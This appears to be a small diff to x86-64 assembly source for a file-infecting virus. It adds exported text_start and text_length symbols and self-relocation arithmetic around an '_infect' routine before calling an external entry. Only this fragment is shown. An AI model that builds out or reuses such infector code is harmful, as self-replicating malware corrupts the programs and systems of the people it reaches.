@@ -2,6 +2,8 @@ section .text
 global _infect
 global size
 global memaddr
+global text_start
+global text_length
 extern entry
 
 _infect:
@@ -32,12 +34,14 @@ text_length: db `00000000`
 begin:
 	mov r14, QWORD[rel diff]
 	lea rax, [rel _infect]
-
-	mov QWORD[rel memaddr], rax
-	
 	sub rax, r14
 	mov r14, rax
-	
+
+	mov r13, QWORD[rel text_start]
+	lea rax, [rel _infect]
+	sub rax, r13
+	mov r13, rax
+	mov QWORD[rel text_start], r13
 
 	call entry
 
